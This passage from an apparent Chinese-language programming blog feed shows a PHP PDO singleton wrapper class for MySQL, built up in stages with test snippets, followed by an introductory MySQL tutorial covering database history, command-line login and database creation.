class="variable">$instance</span> <span class="keyword">instanceof</span> <span class="built_in">self</span>)</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$instance</span>=<span class="keyword">new</span> <span class="built_in">self</span>(<span class="variable">$param</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$instance</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//初始化参数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">initParam</span>(<span class="params"><span class="variable">$param</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;type=<span class="variable">$param</span>[<span class="string">&#x27;type&#x27;</span>]??<span class="string">&#x27;mysql&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;host=<span class="variable">$param</span>[<span class="string">&#x27;host&#x27;</span>]??<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;port=<span class="variable">$param</span>[<span class="string">&#x27;port&#x27;</span>]??<span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dbname=<span class="variable">$param</span>[<span class="string">&#x27;dbname&#x27;</span>]??<span class="string">&#x27;data&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;charset=<span class="variable">$param</span>[<span class="string">&#x27;charset&#x27;</span>]??<span class="string">&#x27;utf8&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$param</span>[<span class="string">&#x27;user&#x27;</span>]??<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pwd=<span class="variable">$param</span>[<span class="string">&#x27;pwd&#x27;</span>]??<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//初始化PDO</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">initPDO</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="variable">$dsn</span>=<span class="string">&quot;<span class="subst">&#123;$this-&gt;type&#125;</span>:host=<span class="subst">&#123;$this-&gt;host&#125;</span>;port=<span class="subst">&#123;$this-&gt;port&#125;</span>;dbname=<span class="subst">&#123;$this-&gt;dbname&#125;</span>;charset=<span class="subst">&#123;$this-&gt;charset&#125;</span>&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;pdo=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>, <span class="variable">$this</span>-&gt;user, <span class="variable">$this</span>-&gt;pwd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PDOException <span class="variable">$ex</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;错误编号：&#x27;</span>.<span class="variable">$ex</span>-&gt;<span class="title function_ invoke__">getCode</span>(),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;错误行号：&#x27;</span>.<span class="variable">$ex</span>-&gt;<span class="title function_ invoke__">getLine</span>(),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;错误文件：&#x27;</span>.<span class="variable">$ex</span>-&gt;<span class="title function_ invoke__">getFile</span>(),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;错误信息：&#x27;</span>.<span class="variable">$ex</span>-&gt;<span class="title function_ invoke__">getMessage</span>(),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="variable">$param</span>=<span class="keyword">array</span>(</span><br><span class="line">);</span><br><span class="line"><span class="variable">$mypdo</span>= MyPDO::<span class="title function_ invoke__">getInstance</span>(<span class="variable">$param</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$mypdo</span>);</span><br></pre></td></tr></table></figure>

<p>第二部分：数据操作部分</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPDO</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$type</span>;      <span class="comment">//数据库类别</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$host</span>;      <span class="comment">//主机地址</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$port</span>;      <span class="comment">//端口号</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$dbname</span>;    <span class="comment">//数据库名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$charset</span>;   <span class="comment">//字符集</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>;      <span class="comment">//用户名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pwd</span>;       <span class="comment">//密码</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pdo</span>;       <span class="comment">//保存PDO对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$instance</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$param</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">initParam</span>(<span class="variable">$param</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">initPDO</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">initException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"><span class="variable">$param</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">self</span>::<span class="variable">$instance</span> <span class="keyword">instanceof</span> <span class="built_in">self</span>)</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$instance</span>=<span class="keyword">new</span> <span class="built_in">self</span>(<span class="variable">$param</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$instance</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//初始化参数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">initParam</span>(<span class="params"><span class="variable">$param</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;type=<span class="variable">$param</span>[<span class="string">&#x27;type&#x27;</span>]??<span class="string">&#x27;mysql&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;host=<span class="variable">$param</span>[<span class="string">&#x27;host&#x27;</span>]??<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;port=<span class="variable">$param</span>[<span class="string">&#x27;port&#x27;</span>]??<span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dbname=<span class="variable">$param</span>[<span class="string">&#x27;dbname&#x27;</span>]??<span class="string">&#x27;data&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;charset=<span class="variable">$param</span>[<span class="string">&#x27;charset&#x27;</span>]??<span class="string">&#x27;utf8&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$param</span>[<span class="string">&#x27;user&#x27;</span>]??<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pwd=<span class="variable">$param</span>[<span class="string">&#x27;pwd&#x27;</span>]??<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//初始化PDO</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">initPDO</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="variable">$dsn</span>=<span class="string">&quot;<span class="subst">&#123;$this-&gt;type&#125;</span>:host=<span class="subst">&#123;$this-&gt;host&#125;</span>;port=<span class="subst">&#123;$this-&gt;port&#125;</span>;dbname=<span class="subst">&#123;$this-&gt;dbname&#125;</span>;charset=<span class="subst">&#123;$this-&gt;charset&#125;</span>&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;pdo=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>, <span class="variable">$this</span>-&gt;user, <span class="variable">$this</span>-&gt;pwd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PDOException <span class="variable">$ex</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">showException</span>(<span class="variable">$ex</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//显示异常</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">showException</span>(<span class="params"><span class="variable">$ex</span>,<span class="variable">$sql</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$sql</span>!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;SQL语句执行失败&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;错误的SQL语句是：&#x27;</span>.<span class="variable">$sql</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;错误编号：&#x27;</span>.<span class="variable">$ex</span>-&gt;<span class="title function_ invoke__">getCode</span>(),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;错误行号：&#x27;</span>.<span class="variable">$ex</span>-&gt;<span class="title function_ invoke__">getLine</span>(),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;错误文件：&#x27;</span>.<span class="variable">$ex</span>-&gt;<span class="title function_ invoke__">getFile</span>(),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;错误信息：&#x27;</span>.<span class="variable">$ex</span>-&gt;<span class="title function_ invoke__">getMessage</span>(),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//设置异常模式</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">initException</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pdo-&gt;<span class="title function_ invoke__">setAttribute</span>(PDO::<span class="variable constant_">ATTR_ERRMODE</span>,PDO::<span class="variable constant_">ERRMODE_EXCEPTION</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//执行增、删、改操作</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;pdo-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$sql</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PDOException <span class="variable">$ex</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">showException</span>(<span class="variable">$ex</span>, <span class="variable">$sql</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取自动增长的编号</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">lastInsertId</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;pdo-&gt;<span class="title function_ invoke__">lastInsertId</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="variable">$param</span>=<span class="keyword">array</span>(</span><br><span class="line">   </span><br><span class="line">);</span><br><span class="line"><span class="variable">$mypdo</span>= MyPDO::<span class="title function_ invoke__">getInstance</span>(<span class="variable">$param</span>);</span><br><span class="line"><span class="comment">//echo $mypdo-&gt;exec(&#x27;delete from news where id=6&#x27;);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$mypdo</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;insert into news values (null,&#x27;11&#x27;,&#x27;1111&#x27;,unix_timestamp())&quot;</span>))</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;自动增长的编号是：&#x27;</span>.<span class="variable">$mypdo</span>-&gt;<span class="title function_ invoke__">lastInsertId</span> ();</span><br></pre></td></tr></table></figure>



<p>第三部分：数据查询部分</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPDO</span></span>&#123;</span><br><span class="line">   ...</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//判断匹配的类型</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">fetchType</span>(<span class="params"><span class="variable">$type</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$type</span>)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;num&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> PDO::<span class="variable constant_">FETCH_NUM</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;both&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> PDO::<span class="variable constant_">FETCH_BOTH</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;obj&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> PDO::<span class="variable constant_">FETCH_OBJ</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                 <span class="keyword">return</span> PDO::<span class="variable constant_">FETCH_ASSOC</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取所有数据 ，返回二维数组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetchAll</span>(<span class="params"><span class="variable">$sql</span>,<span class="variable">$type</span>=<span class="string">&#x27;assoc&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="variable">$stmt</span>=<span class="variable language_">$this</span>-&gt;pdo-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);  <span class="comment">//获取PDOStatement对象</span></span><br><span class="line">            <span class="variable">$type</span>= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetchType</span>(<span class="variable">$type</span>); <span class="comment">//获取匹配方法</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>(<span class="variable">$type</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$ex</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">showException</span>(<span class="variable">$ex</span>, <span class="variable">$sql</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取一维数组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetchRow</span>(<span class="params"><span class="variable">$sql</span>,<span class="variable">$type</span>=<span class="string">&#x27;assoc&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="variable">$stmt</span>=<span class="variable language_">$this</span>-&gt;pdo-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);  <span class="comment">//获取PDOStatement对象</span></span><br><span class="line">            <span class="variable">$type</span>= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetchType</span>(<span class="variable">$type</span>); <span class="comment">//获取匹配方法</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>(<span class="variable">$type</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$ex</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">showException</span>(<span class="variable">$ex</span>, <span class="variable">$sql</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//返回一行一列</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetchColumn</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">             <span class="variable">$stmt</span>=<span class="variable language_">$this</span>-&gt;pdo-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchColumn</span>();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$ex</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">showException</span>(<span class="variable">$ex</span>, <span class="variable">$sql</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="variable">$param</span>=<span class="keyword">array</span>(</span><br><span class="line">   </span><br><span class="line">);</span><br><span class="line"><span class="variable">$mypdo</span>= MyPDO::<span class="title function_ invoke__">getInstance</span>(<span class="variable">$param</span>);</span><br><span class="line"><span class="comment">//echo $mypdo-&gt;exec(&#x27;delete from news where id=6&#x27;);</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">if($mypdo-&gt;exec(&quot;insert into news values (null,&#x27;11&#x27;,&#x27;1111&#x27;,unix_timestamp())&quot;))</span></span><br><span class="line"><span class="comment">    echo &#x27;自动增长的编号是：&#x27;.$mypdo-&gt;lastInsertId ();</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//$list=$mypdo-&gt;fetchAll(&#x27;select * from news&#x27;);</span></span><br><span class="line"><span class="comment">//$list=$mypdo-&gt;fetchRow(&#x27;select * from news where id=1&#x27;);</span></span><br><span class="line"><span class="variable">$list</span>=<span class="variable">$mypdo</span>-&gt;<span class="title function_ invoke__">fetchColumn</span>(<span class="string">&#x27;select count(*) from news&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$list</span>);</span><br></pre></td></tr></table></figure>















]]></content>
  </entry>
  <entry>
    <title>MYSQL数据库基础</title>
    <url>/2023/04/23/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="1-2-数据库介绍"><a href="#1-2-数据库介绍" class="headerlink" title="1.2  数据库介绍"></a>1.2  数据库介绍</h2><h4 id="1-2-1-作用"><a href="#1-2-1-作用" class="headerlink" title="1.2.1  作用"></a>1.2.1  作用</h4><p>数据库是用来存放数据的仓库</p>
<p>数据库中存放的是表，表中存放的是数据。</p>
<h4 id="1-2-2-数据库的发展史"><a href="#1-2-2-数据库的发展史" class="headerlink" title="1.2.2  数据库的发展史"></a>1.2.2  数据库的发展史</h4><p>萌芽阶段：文件系统</p>
<p>最初始的数据库是用磁盘来存储数据的。文件就是最早的数据库。</p>
<p>第一代数据库：层次模型</p>
<p>优点：这是导航结构</p>
<p>优点：结构清晰，分类查询方便</p>
<p>缺点：有可能造成数据无效</p>
<p> 第一代数据库：网状模型</p>
<p>网状模型解决了层次模型的数据不一致的问题，但没有解决导航问题。导航结构在查询中有时候效率低下，比如查询整个公司的四月的营业额。</p>
<p> 第二阶段：关系模型</p>
<p>特点：</p>
<p>1、每个表都是独立的</p>
<p>2、通过关系字段将两个表连接起来</p>
<p>3、关系：两个表的公共字段</p>
<p>4、关系型数据库中多表联合查询效率低下。</p>
<p>多学一招：为了解决关系型数据库多表查询效率的问题，项目中使用了NoSQL(非关系型数据库，Redis、mongodb等等)，在数据库中按照键值对来存储，它是关系型数据库的补充。</p>
<h4 id="1-2-3-SQL"><a href="#1-2-3-SQL" class="headerlink" title="1.2.3  SQL"></a>1.2.3  SQL</h4><p>Structured Query Language（结构化查询语言），是用来操作关系型数据库的一门语言。这是一个关系型数据库的通用操作语言，也成为标准SQL，也叫SQL-92。</p>
<p>脚下留心：数据库的生产厂商为了占有市场份额，都会在标准SQL的基础上扩展一些自己的东西以吸引用户。</p>
<h4 id="1-2-4-常用的关系型数据库"><a href="#1-2-4-常用的关系型数据库" class="headerlink" title="1.2.4  常用的关系型数据库"></a>1.2.4  常用的关系型数据库</h4><table>
<thead>
<tr>
<th>关系型数据库</th>
<th>开发公司</th>
<th>使用语言</th>
</tr>
</thead>
<tbody><tr>
<td>access</td>
<td>微软公司</td>
<td>SQL</td>
</tr>
<tr>
<td>SQL Server</td>
<td>微软公司</td>
<td>T-SQL</td>
</tr>
<tr>
<td>Oracle</td>
<td>甲骨文公司</td>
<td>PL&#x2F;SQL</td>
</tr>
<tr>
<td>MySQL</td>
<td>被甲骨文公司收购</td>
<td>MySQL</td>
</tr>
</tbody></table>
<p>思考：已知标准SQL可以在所有的关系型数据库上运行，在Oracle上编写的PL&#x2F;SQL能否在MySQL上运行？</p>
<p>答：不可以，只能运行标准SQL</p>
<h2 id="1-3-连接服务器"><a href="#1-3-连接服务器" class="headerlink" title="1.3  连接服务器"></a>1.3  连接服务器</h2><p>数据库是CS模式的软件，所以要连接数据库必须要有客户端软件。</p>
<p>MySQL数据库默认端口号是3306</p>
<h4 id="1-3-1-window界面连接服务器"><a href="#1-3-1-window界面连接服务器" class="headerlink" title="1.3.1  window界面连接服务器"></a>1.3.1  window界面连接服务器</h4><p>1、Navicat</p>
<p>2、MySQL-Front</p>
<h4 id="1-3-2-通过web窗体连接"><a href="#1-3-2-通过web窗体连接" class="headerlink" title="1.3.2  通过web窗体连接"></a>1.3.2  通过web窗体连接</h4><p>主要有浏览器就可以访问数据库</p>
<h4 id="1-3-3-命令行连接"><a href="#1-3-3-命令行连接" class="headerlink" title="1.3.3  命令行连接"></a>1.3.3  命令行连接</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">host		-h	主机</span><br><span class="line">port		-P	端口号   （大写）</span><br><span class="line">user		-u	用户名</span><br><span class="line">password	-p	密码     （小写）</span><br></pre></td></tr></table></figure>

<p>例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 连接数据库</span><br><span class="line">F:\wamp\PHPTutorial\MySQL\bin&gt;mysql -h127.0.0.1 -P3306 -uroot -proot  -- 明文</span><br><span class="line"></span><br><span class="line">-- 如果连接本地数据库 -h可以省略 如果服务器端口是3306，-P端口号也可以省略</span><br><span class="line">F:\wamp\PHPTutorial\MySQL\bin&gt;mysql -uroot -proot	-- 明文</span><br><span class="line"></span><br><span class="line">-- 密文</span><br><span class="line">F:\wamp\PHPTutorial\MySQL\bin&gt;mysql -uroot -p  </span><br><span class="line">Enter password: ****</span><br></pre></td></tr></table></figure>

<h4 id="1-3-4-退出登录"><a href="#1-3-4-退出登录" class="headerlink" title="1.3.4  退出登录"></a>1.3.4  退出登录</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; exit		-- 方法一</span><br><span class="line">mysql&gt; quit		-- 方法二</span><br><span class="line">mysql&gt; \q		-- 方法三</span><br></pre></td></tr></table></figure>



<h2 id="1-4-数据库基本概念"><a href="#1-4-数据库基本概念" class="headerlink" title="1.4  数据库基本概念"></a>1.4  数据库基本概念</h2><h4 id="1-4-1-数据库、表相关"><a href="#1-4-1-数据库、表相关" class="headerlink" title="1.4.1  数据库、表相关"></a>1.4.1  数据库、表相关</h4><ol>
<li><p>数据库：数据库中存放的是表，一个数据库中可以存放多个表</p>
</li>
<li><p>表：表是用来存放数据的。</p>
</li>
<li><p>关系：两个表的公共字段</p>
</li>
<li><p>行：也称记录，也称实体</p>
</li>
<li><p>列：也称字段，也称属性</p>
</li>
</ol>
<p>脚下留心：就表结构而言，表分为行和列；就表数据而言，表分为记录和字段；就面向对象而言，一个记录就是一个实体，一个字段就是一个属性。</p>
<h4 id="1-4-2-数据相关"><a href="#1-4-2-数据相关" class="headerlink" title="1.4.2  数据相关"></a>1.4.2  数据相关</h4><p>1、数据冗余：相同的数据存储在不同的地方</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">冗余只能减少，不能杜绝。</span><br><span class="line">减少冗余的方法是分表</span><br></pre></td></tr></table></figure>



<p> 2、数据完整性：正确性+准确性&#x3D;数据完整性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">正确性：数据类型正确</span><br><span class="line">准确性：数据范围要准确</span><br></pre></td></tr></table></figure>

<p>思考：学生的年龄是整型，输入1000岁，正确性和准确性如何？</p>
<p>答：正确的，但不准确。失去了数据完整性。</p>
<h2 id="1-5-数据库的操作"><a href="#1-5-数据库的操作" class="headerlink" title="1.5  数据库的操作"></a>1.5  数据库的操作</h2><h4 id="1-5-1-创建数据库"><a href="#1-5-1-创建数据库" class="headerlink" title="1.5.1  创建数据库"></a>1.5.1  创建数据库</h4><p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database [if not exists] 数据名 [选项]</span><br></pre></td></tr></table></figure>

<p>例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 创建数据库</span><br><span class="line">mysql&gt; create database stu;</span><br><span class="line">Query OK, 1 row affected (0.06 sec)</span><br><span class="line"></span><br><span class="line">-- 创建数据库时，如果数据库已经存在就要报错</span><br><span class="line">mysql&gt; create database stu;</span><br><span class="line"># ERROR 1007 (HY000): Can&#x27;t create database &#x27;stu&#x27;; database exists</span><br><span class="line"></span><br><span class="line">-- 在创建数据库时候，判断数据库是否存在，不存在就创建</span><br><span class="line">mysql&gt; create database if not exists stu;</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 特殊字符、关键字做数据库名，使用反引号将数据库名括起来</span><br><span class="line">mysql&gt; create database `create`;</span><br><span class="line">Query OK, 1 row affected (0.04 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create database `%$`;</span><br><span class="line">Query OK, 1 row affected (0.05 sec)</span><br><span class="line"></span><br><span class="line">-- 创建数据库时指定存储的字符编码</span><br><span class="line">mysql&gt; create database emp charset=gbk;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"># 如果不指定编码，数据库默认使用安装数据库时指定的编码</span><br></pre></td></tr></table></figure>



<p>MySQL数据库的目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库保存的路径在安装MySQL的时候就配置好。</span><br><span class="line">也可以在my.ini配置文件中更改数据库的保存地址。(datadir=&quot;F:/wamp/PHPTutorial/MySQL/data/&quot;)</span><br><span class="line">一个数据库就对应一个文件夹，在文件夹中有一个db.opt文件。在此文件中设置数据库的字符集和校对集</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<p>1、如果创建的数据库已存在，就会报错。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解决方法：创建数据库的时候判断一下数据库是否存在，如果不存在再创建</span><br></pre></td></tr></table></figure>

<p>2、如果数据库名是关键字和特殊字符要报错。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解决：在特殊字符、关键字行加上反引号</span><br></pre></td></tr></table></figure>

<p>3、创建数据库的时候可以指定字符编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">脚下留心：创建数据库如果不指定字符编码，默认和MySQL服务器的字符编码是一致的。</span><br></pre></td></tr></table></figure>



<h4 id="1-5-2-显示所有数据库"><a href="#1-5-2-显示所有数据库" class="headerlink" title="1.5.2  显示所有数据库"></a>1.5.2  显示所有数据库</h4><p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases</span><br></pre></td></tr></table></figure>

<p>例题</p>
